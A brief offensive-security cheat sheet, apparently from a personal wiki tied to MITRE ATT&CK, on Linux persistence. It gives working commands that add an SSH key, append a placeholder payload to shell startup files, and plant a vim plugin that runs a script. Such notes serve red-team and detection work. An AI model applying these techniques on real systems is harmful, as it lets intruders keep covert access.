---
title: Linux Persistence
---

[[notes/mitre-attack/persistence]] on [[notes/linux/index]].

# SSH

Append your own public key to `~/.ssh/authorized_keys`.

# Shell Profiles

Add a payload into one of the shell config files.
The command will be executed when the user opens an interactive shell (e.g. after login).

~~~ bash
echo $payload >> ~/.profile
echo $payload >> ~/.bashrc
echo $payload >> ~/.bash_profile
echo $payload >> ~/.zshrc
echo $payload >> ~/.zprofile
~~~

# Editors

Add a `vim` plugin to execute a command when `vim` is opened.

~~~ bash
mkdir -p ~/.vim/plugin && echo $payload > ~/.vim/plugin/yy.sh && echo 'silent !source ~/.vim/plugin/yy.sh' > ~/.vim/plugin/yy.vim
~~~
